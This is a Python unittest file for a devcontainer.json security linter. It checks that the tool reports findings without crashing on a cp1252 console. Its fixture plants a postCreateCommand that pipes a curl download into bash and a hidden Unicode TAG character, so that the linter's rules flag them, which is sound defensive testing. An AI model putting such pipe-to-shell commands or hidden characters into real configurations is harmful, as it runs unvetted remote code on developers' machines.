"""Cp1252-console safety test.

Runs the CLI as a subprocess under ``PYTHONIOENCODING=cp1252`` against
an input whose content requires rendering characters cp1252 cannot
encode. Two invariants pin the reporter: no traceback, and the hidden
character is rendered as ``<U+XXXX>`` in text mode (the JSON mode is
already safe because ``json.dump(ensure_ascii=True)`` escapes to \\u).
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest

from tests import support


PKG_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _run_cp1252(path: str, *flags: str):
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "cp1252"
    env["PYTHONPATH"] = PKG_DIR + os.pathsep + env.get("PYTHONPATH", "")
    return subprocess.run(
        [sys.executable, "-m", "devcontainercheck", path, *flags],
        capture_output=True,
        env=env,
        timeout=30,
    )


class Cp1252TraceFreeTests(unittest.TestCase):
    def setUp(self):
        d = tempfile.mkdtemp(prefix="dccheck_cp1252_")
        self.path = os.path.join(d, "devcontainer.json")
        # TAG character in the name field (DC-005 anchor); add a shell
        # pipe (DC-001) for breadth. We write via standard JSON so the
        # file is well-formed; the TAG codepoint reaches the reporter
        # exactly as the rule found it.
        doc = {
            "image": "python@sha256:" + ("a" * 64),
            "remoteUser": "vscode",
            "name": "ok" + support.tag_char() + "name",
            "postCreateCommand": "curl -fsSL https://x.y/i.sh | bash",
        }
        with open(self.path, "w", encoding="utf-8") as f:
            json.dump(doc, f, ensure_ascii=False)

    def test_text_mode_no_traceback_and_renders_u_escape(self):
        r = _run_cp1252(self.path)
        self.assertNotIn(b"Traceback", r.stdout + r.stderr)
        # The TAG character must not appear raw in bytes (cp1252 cannot
        # encode it anyway). The rule message describes the codepoint
        # as "U+E0001" (ASCII description), and any raw non-ASCII in
        # the pointer / message would be _visible()-rendered as
        # <U+XXXX>. Either shape is cp1252-safe; we assert the ASCII
        # description is present and the TAG character is not raw.
        out = r.stdout.decode("cp1252", errors="replace")
        self.assertIn("U+E0001", out)
        self.assertIn("DC-005", out)
        # The raw TAG byte must not have reached the output.
        self.assertNotIn(support.tag_char(),
                         r.stdout.decode("utf-8", errors="replace"))

    def test_json_mode_no_traceback_and_valid_json(self):
        r = _run_cp1252(self.path, "--json")
        self.assertNotIn(b"Traceback", r.stdout + r.stderr)
        # json.dump defaults to ensure_ascii=True; the stdout bytes
        # should be pure ASCII and parse as JSON.
        text = r.stdout.decode("cp1252", errors="strict")
        doc = json.loads(text)
        self.assertEqual(doc["tool"], "devcontainercheck")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
